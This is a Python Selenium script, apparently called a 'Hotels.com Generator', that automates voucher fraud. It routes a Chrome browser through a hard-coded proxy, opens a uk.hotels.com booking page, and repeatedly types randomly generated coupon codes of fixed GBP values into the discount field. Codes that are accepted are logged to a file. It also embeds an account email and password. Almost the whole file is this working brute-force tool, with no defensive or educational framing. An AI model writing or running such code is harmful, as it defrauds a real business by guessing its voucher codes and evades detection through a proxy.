from selenium import webdriver
chrome_options = webdriver.ChromeOptions()
#options.add_argument('headless')
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.proxy import Proxy, ProxyType
import names
import random
import rstr
import time
from colorama import Fore, init



def checker():

    i = 0
    
    #mypillow()
    #input('MyPillow has exited')
    #sort()
    #input('[test]')

    name = names.get_first_name()
    username = 'Amandalor3@infotechi.33mail.com'
    password = 'Newpass123'
    useragent = 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)'
    print('Hotels.com Generator')
    pick = input('[1] - 110GBP | [2] - 200GBP | [3] - 300GBP | [4] - 500GBP | [5] - 750GBP: ')
    if pick == '1':
        code = 'aftes110:'
    if pick == '2':
        code = 'aftes200:'
    if pick == '3':
        code = 'aftes300:'
    if pick == '4':
        code = 'aftes500:'
    if pick == '5':
        code = 'aftes750C:'
    else:
        print("wrong input")
        checker()


    a = 1

    while a < 5:
        PROXY = '3.14.8.17:3128'

        r = random.randint(1, 10)
        type = 'none'
        time_ = 'none'
        
        proxy = Proxy()
        proxy.proxyType = ProxyType.MANUAL
        proxy.autodetect = False
        proxy.httpProxy = proxy.sslProxy = proxy.socksProxy = PROXY
        chrome_options.Proxy = proxy
        chrome_options.add_argument("ignore-certificate-errors")

        #chrome_options.add_argument('--proxy-server=%s' % PROXY)
        driver = webdriver.Chrome('/Users/cmartini/Documents/chromedriver/chromedriver', chrome_options=chrome_options)
        driver.get("https://miip.es")
        time.sleep(2)
        
        a = a + 1
        #chrome_options.add_argument('--proxy-server=%s' % PROXY)
        
        driver.get('https://uk.hotels.com/?rffrid=mdp.hcom.GB.550.000.00&PSRC=TESCO')
        driver.get('https://uk.hotels.com/ho113412/?q-check-out=2020-03-15&FPQ=3&q-check-in=2020-03-10&WOE=7&WOD=5&q-room-0-children=0&pa=3&tab=description&JHR=4&q-room-0-adults=3&YGF=1&MGT=2&ZSX=0&SYE=3')
        #driver.find_element_by_xpath('//*[@id="book-now-button"]').click()
        time.sleep(2)
        driver.find_element_by_xpath('//*[@id="rooms-and-rates.room-1-rateplan-1"]/button').submit()
        time.sleep(2)
        #driver.find_element_by_xpath('//*[@id="pay-now-etp-form"]/button').submit()
        #time.sleep(2)
        driver.execute_script('window.scrollTo(10, 1000);')
        time.sleep(5)
        driver.find_element_by_xpath('//*[@id="deals-and-discounts"]/div[1]/button').click()
        time.sleep(2)
        while True:
            voucher = rstr.xeger(r'[a-z][A-Z]\d[A-Z]')
            print('ATTEMPTING CODE : {' + code + voucher + '}')
            driver.find_element_by_xpath('//*[@id="coupon-code-field"]').send_keys(code + voucher)
            driver.find_element_by_xpath('//*[@id="coupon-code-apply-btn"]').click()
            time.sleep(4)
            try:
                driver.find_element_by_xpath('//*[@id="coupon-code-error-message"]/em').click()
                print(Fore.RED + '[i] INVALID VOUCHER [%s]' % voucher)
                driver.find_element_by_xpath('//*[@id="coupon-code-field"]').clear()
                time.sleep(3)
            except:
                print( Fore.GREEN + '[i] VALID VALID VALID VALID Valid voucher [%s][%s]' % (code, voucher))
                with open("valid.txt", "a") as myfile:
                    myfile.write(code + voucher + '\n')
                time.sleep(1)
                driver.find_element_by_xpath('//*[@id="coupon-code-remove-btn"]').click()
                time.sleep(1)

    time.sleep(10)
    input('test')


if __name__ == '__main__':
    init(autoreset=True)
    checker()


